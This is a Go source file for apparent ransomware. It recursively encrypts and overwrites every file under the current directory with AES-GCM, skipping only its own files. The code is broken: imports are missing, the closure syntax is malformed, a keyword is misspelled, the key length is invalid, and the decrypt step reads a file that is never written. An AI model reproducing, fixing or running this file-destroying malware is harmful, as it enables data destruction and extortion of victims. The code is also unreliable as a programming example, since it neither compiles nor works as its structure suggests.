package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"database/sql"
	"fmt"
	"os"
	"time"

	_ "github.com/go-sql-driver/mysql" 
)


func Encrypt(plaintext []byte, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	nonce := make([]byte, gcm.NonceSize())
	if _, err := rand.Read(nonce); err != nil {
		return nil, err
	}

	ciphertext := gcm.Seal(nil, nonce, plaintext, nil)
	return append(nonce, ciphertext...), nil
}

func Decrypt(ciphertext []byte, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	nonceSize := gcm.NonceSize()
	if len(ciphertext) < nonceSize {
		return nil, fmt.Errorf("ciphertext too short")
	}

	nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return nil, err
	}

	return plaintext, nil
}

func writeToFile(filename string, content []byte) error {
	tmpFilePath := filename + ".tmp"

	err := os.WriteFile(tmpFilePath, content, 0644)
	if err != nil {
		return err
	}

	return os.Rename(tmpFilePath, filename)
}

func doEncrypt(currentDir string, key []byte) {
	err := filepath.Walk(currentDir, func(path string, info os.FileInfo, err error))
	error {
		if err != nil {
			return err
		}

		if info.IsDir(){
			return nil
		}

		if info.Name() == "ransomware" || info.Name() == "ransomware.go"{
			return nil
		}

		//Read file content
		fileContent, err := ioutil.ReadFile(path)
		if err != nil{
			return err
		}

		//Encrypt file content
		encryptedContent, err := Encrypt(fileContent, key)
		if err != nil{
			retrun err
		}

		err = writeToFile(path, encryptedContent)
		if err != nil{
			return err
		}

		fmt.Printf("File '%s' encrypted and overwritten successfully.\n", path)
		return nil

	})

	if err != nil {
		fmt.Println("Error encrypting files:", err)
		return
	}

	fmt.Println("All files encrypted and overwritten successfully.")
}

func doDecrypt(currentDir string, key []byte) {
	encryptedData, err := os.ReadFile(currentDir + "/encrypted_data.bin")
	if err != nil {
		panic(err.Error())
	}

	decryptedData, err := Decrypt(encryptedData, key)
	if err != nil {
		panic(err.Error())
	}

	writeToFile(currentDir+"/decrypted_data.txt", decryptedData)
}

func main() {
	key := []byte("PutYourKeyEncryptionKeyHere1234567890")

	currentDir, err := os.Getwd()
	if err != nil {
		fmt.Println("Error getting current directory:", err)
		return
	}

	doEncrypt(currentDir, key)
	time.Sleep(time.Second * 2) // Wait for encryption to complete
	doDecrypt(currentDir, key)
}
